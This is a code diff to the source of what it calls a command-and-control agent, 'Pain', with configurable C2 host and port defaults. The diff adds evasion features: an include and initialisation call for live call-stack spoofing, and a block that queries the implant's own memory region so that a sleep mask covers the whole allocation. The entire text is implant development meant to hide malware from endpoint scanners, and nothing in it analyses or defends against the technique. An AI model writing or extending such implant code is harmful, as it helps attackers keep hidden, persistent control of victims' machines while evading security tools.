@@ -5,6 +5,7 @@
 #include <Hash.h>
 #include <LdrLoad.h>
 #include <Internals.h>
+#include <Spoof.h>
 
 // C2 build config defaults - override via: make PAIN_C2_HOST='"10.0.0.1"' PAIN_C2_PORT=443
 #ifndef PAIN_C2_HOST
@@ -47,6 +48,20 @@ DECLFN Root::Agent::Agent()
     Ntdll.Handle = LdrLoad::Module( Hash::Str( L"ntdll.dll" ) );
     if ( !Ntdll.Handle ) return;
     RSL_IMP( Ntdll );
+
+    // EndPtr lands on the first page AFTER real code; the PE image may pad one more
+    // alignment page beyond that, causing VirtualProtect to split the region.
+    // Query the actual region size now (before any VirtualProtect splits it) so sleep
+    // mask covers the full allocation.
+    {
+        MEMORY_BASIC_INFORMATION mbi = {};
+        NTSTATUS st = Ntdll.NtQueryVirtualMemory( (HANDLE)-1, (PVOID)Base.Start,
+                          0, &mbi, sizeof(mbi), nullptr );
+        if ( NT_SUCCESS(st) ) {
+            ULONG_PTR full = (ULONG_PTR)mbi.BaseAddress + (ULONG_PTR)mbi.RegionSize - Base.Start;
+            if ( full > Base.Length ) Base.Length = full;
+        }
+    }
 
     // find kernel32 and resolve all its function pointer
     Krnl32.Handle = LdrLoad::Module( Hash::Str( L"kernel32.dll" ) );
@@ -280,6 +295,11 @@ DECLFN void Root::Agent::Init()
         }
         Self->Ntdll.DbgPrint( "[Pain] Elevated: %d\n", (int)Self->Machine.Elevated );
     }
+
+    // initialise live call-stack spoofing (requires Ntdll + Krnl32 resolved above)
+#if PAIN_STACK_SPOOF
+    Spoof_Init();
+#endif
 
     Self->Ntdll.DbgPrint( "[Pain] Init() done\n" );
 }
